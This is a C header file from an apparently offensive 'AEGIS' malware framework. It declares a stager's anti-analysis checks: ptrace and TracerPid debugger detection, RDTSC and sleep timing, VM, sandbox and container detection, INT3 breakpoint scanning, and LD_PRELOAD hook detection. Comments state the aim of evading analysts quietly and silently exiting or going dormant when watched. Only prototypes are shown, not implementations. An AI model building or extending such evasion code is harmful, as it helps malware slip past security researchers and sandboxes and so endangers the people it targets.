/*
 * ============================================================================
 *  AEGIS FRAMEWORK — Anti-Analysis Suite (Header)
 * ============================================================================
 *  Classification : PRIVATE — LO/ENI EYES ONLY
 *  Component      : stager/anti_analysis.h
 *  Purpose        : Comprehensive anti-analysis, anti-debug, anti-VM,
 *                   anti-sandbox checks.  All checks are designed to be
 *                   fast and quiet — no suspicious error messages or
 *                   dramatic exits that would tip off an analyst.
 * ============================================================================
 */

#ifndef AEGIS_ANTI_ANALYSIS_H
#define AEGIS_ANTI_ANALYSIS_H

#include "../common/types.h"

/*
 * aegis_aa_full_check — Run the complete anti-analysis battery.
 * Returns AEGIS_OK if the environment appears clean.
 * Returns AEGIS_ERR_ANTIANALYSIS if any check fails.
 *
 * On failure, the caller should silently exit (no error messages)
 * or enter a dormant state, depending on operational parameters.
 */
aegis_result_t aegis_aa_full_check(void);

/* ── Individual Checks (can be called selectively) ───────────────────────── */

/* Debugger detection via ptrace self-attach */
aegis_result_t aegis_aa_check_ptrace(void);

/* /proc/self/status TracerPid check */
aegis_result_t aegis_aa_check_tracer_pid(void);

/* Timing-based debug detection (RDTSC gap analysis) */
aegis_result_t aegis_aa_check_rdtsc_timing(void);

/* Sleep-and-check timing for sandbox fast-forward detection */
aegis_result_t aegis_aa_check_sleep_timing(void);

/* Check for hostile processes (debuggers, tracers, sniffers) */
aegis_result_t aegis_aa_check_hostile_procs(void);

/* VM detection: CPUID hypervisor bit, known VM artifacts */
aegis_result_t aegis_aa_check_vm(void);

/* VM detection: known MAC address OUI prefixes */
aegis_result_t aegis_aa_check_vm_mac(void);

/* Sandbox detection: insufficient resources (CPU cores, RAM, disk) */
aegis_result_t aegis_aa_check_sandbox_resources(void);

/* Container detection: cgroups, namespaces, /.dockerenv */
aegis_result_t aegis_aa_check_container(void);

/* Breakpoint detection: INT3 (0xCC) scanning on our own code */
aegis_result_t aegis_aa_check_breakpoints(void *code_start, size_t code_len);

/* System uptime check: freshly booted systems are suspicious */
aegis_result_t aegis_aa_check_uptime(void);

/* LD_PRELOAD detection: check if someone is trying to hook us */
aegis_result_t aegis_aa_check_ld_preload(void);

#endif /* AEGIS_ANTI_ANALYSIS_H */
